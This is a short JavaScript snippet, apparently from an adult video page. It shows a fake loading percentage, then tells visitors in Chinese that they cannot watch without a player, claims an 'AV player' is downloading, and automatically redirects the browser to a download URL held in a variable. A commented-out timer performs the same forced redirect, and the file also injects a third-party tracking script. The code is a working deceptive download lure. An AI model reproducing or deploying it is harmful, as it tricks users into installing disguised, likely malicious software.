var bar=0;
var line="||";
var amount="||";
count();
function count(){
	bar=bar+2;
	amount=amount+line;
	document.getElementById('baifenbi').innerHTML=bar+"%";
	if(bar<16){
		setTimeout("count()",500);
	}else{
		alert(tixing);
		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="color:#c3c3c3;">不能观看？点此下载播放器</span></a>';
		document.getElementById('note').innerHTML='<div style="height:25px;line-height:25px;font-size:13px;color:#00FF00;">AV播放器下载中，请耐心等待，一会提醒您安装...</div>';
		window.location.href=appurl2;
	}
}
//var cheattime="12";function cheat(){if(cheattime<=0){location.href=appurl2;}else{setTimeout('cheat()',999);}cheattime--;}cheat();

document.writeln("<script language=\"javascript\" type=\"text\/javascript\" src=\"http:\/\/js.users.51.la\/17440402.js\"><\/script>
<noscript><a href=\"http:\/\/www.51.la\/?17440402\" target=\"_blank\"><img alt=\"&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;\" src=\"http:\/\/img.users.51.la\/17440402.asp\" style=\"border:none\" \/><\/a><\/noscript>")
